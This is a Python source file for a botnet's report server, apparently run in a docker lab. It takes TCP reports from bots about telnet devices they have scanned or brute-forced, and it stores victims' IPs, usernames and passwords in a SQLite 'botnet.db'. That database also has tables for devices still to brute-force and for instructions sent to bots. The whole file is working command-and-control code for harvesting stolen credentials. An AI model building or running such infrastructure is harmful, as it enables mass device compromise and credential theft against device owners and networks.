#!/usr/bin/env python3
"""
Passive report server — receives victim reports from bots and logs them.
Listens on TCP, stores to SQLite.
"""

import hashlib
import socket
import sqlite3
import threading
import inspect
import datetime
import signal
import sys
import os

HOST = "172.18.0.1" # docker bridge
PORT = int(os.getenv("REPORT_PORT", 5000))
default_db_path = os.path.join(os.path.dirname(inspect.stack()[0][1]), "../db/botnet.db")
DB   = os.getenv("DB_PATH", default_db_path)


# ─────────────────────────────────────────
# Database
# ─────────────────────────────────────────

def get_con():
    con = sqlite3.connect(DB, check_same_thread=False)
    con.execute("PRAGMA journal_mode=WAL")  # safe alongside controller process
    return con


def db_init():
    con = get_con()
    con.executescript("""
        CREATE TABLE IF NOT EXISTS devices (
            device_id   TEXT PRIMARY KEY,
            ip          TEXT,
            username    TEXT,
            password    TEXT,
            busy        INTEGER,
            arch        TEXT,
            cpu_load    REAL,
            memory      REAL,
            uptime      REAL,
            first_seen  TEXT,
            last_seen   TEXT,
            infected    INTEGER
        );

        CREATE TABLE IF NOT EXISTS devices_tobrute (
            device_id   INTEGER PRIMARY KEY AUTOINCREMENT,
            ip          TEXT UNIQUE,
            scanned_by_ip TEXT,
            bruted INTEGER
        );

        CREATE TABLE IF NOT EXISTS instructions (
            device_id TEXT PRIMARY KEY,
            instruction TEXT,
            status INT,
            FOREIGN KEY (device_id) REFERENCES devices(device_id)
        );
    """) # TODO:
    # scanned_by_ip is useful to keep if we want to tell the device who found it to also brute it
    con.commit()
    con.close()


def db_insert(device_id, ip, username, password):
    con = get_con()
    now = datetime.datetime.now(datetime.UTC)
    con.execute("""
        INSERT INTO devices (device_id, ip, username, password, first_seen, last_seen, infected, busy)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(device_id) DO UPDATE SET
            ip        = excluded.ip,
            username  = excluded.username,
            password  = excluded.password,
            last_seen = excluded.last_seen
    """, (device_id, ip, username, password, now, now, 0, 0))
    con.commit()
    con.close()

def db_insert_tobrute(ip, scanned_by_ip):
    con = get_con()
    con.execute("""
        INSERT INTO devices_tobrute (ip, scanned_by_ip, bruted)
        VALUES (?, ?, 0)
        ON CONFLICT(ip) DO NOTHING
    """, [ip, scanned_by_ip])
    con.commit()
    con.close()

def db_dump():
    con = get_con()
    rows = con.execute("""
        SELECT device_id, ip, username, password, arch, cpu_load, memory, uptime, first_seen, last_seen
        FROM devices
        ORDER BY first_seen DESC
    """).fetchall()
    con.close()
    return rows


# ─────────────────────────────────────────
# Connection handler
# ─────────────────────────────────────────

def generate_device_id(ip, username, passwd):
    raw = f"{ip}:{username}:{passwd}".encode()
    return "dev-" + hashlib.sha1(raw).hexdigest()[:12]

def handle_client(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]}")
    try:
        data = b""
        while True:
            chunk = conn.recv(1024)
            if not chunk:
                break
            data += chunk

        # Expected format per line:
        #   IP:user:pass -> bruted device
        #   s:IP         -> scanned ip has telnet port open
        for line in data.decode(errors="ignore").splitlines():
            line = line.strip()
            print(line)
            if not line:
                continue

            parts = line.split(":")
            if len(parts) == 2:
                s, ip = parts
                db_insert_tobrute(ip, addr[0]);
                print(f"  [DEVICE] {ip} scanned by {addr[0]} added")
            elif len(parts) == 3:
                ip, user, pwd = parts
                device_id = generate_device_id(ip, user, pwd)

                db_insert(device_id, ip, user, pwd)
                print(f"  [DEVICE] {device_id}  {ip} {user}:{pwd}")
            else:
                print(f"  [!] Unrecognised format: {line}")
                continue


    except Exception as e:
        print(f"  [!] Error handling {addr}: {e}")
    finally:
        conn.close()


# ─────────────────────────────────────────
# Server
# ─────────────────────────────────────────

def start_server():
    db_init()
    print(f"[*] Report server listening on {HOST}:{PORT}")
    print(f"[*] Shared DB: {DB}\n")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(64)

    def shutdown(sig, frame):
        print("\n[*] Shutting down.")
        srv.close()
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown)

    while True:
        try:
            conn, addr = srv.accept()
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            t.start()
        except OSError:
            break


# ─────────────────────────────────────────
# CLI dump
# ─────────────────────────────────────────

def print_devices():
    rows = db_dump()
    if not rows:
        print("No devices recorded yet.")
        return
    header = f"{'ID':<12} {'IP':<16} {'Port':<6} {'User':<14} {'Pass':<14} {'Arch':<8} {'CPU':<6} {'Mem%':<6} {'First seen'}"
    print(header)
    print("-" * len(header))
    for r in rows:
        print(
            f"{str(r[0]):<12} {str(r[1]):<16} {str(r[2]):<6} {str(r[3]):<14} "
            f"{str(r[4]):<14} {str(r[5] or ''):<8} {str(r[6] or ''):<6} "
            f"{str(r[7] or ''):<6} {r[9]}"
        )


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "dump":
        print_devices()
    else:
        start_server()
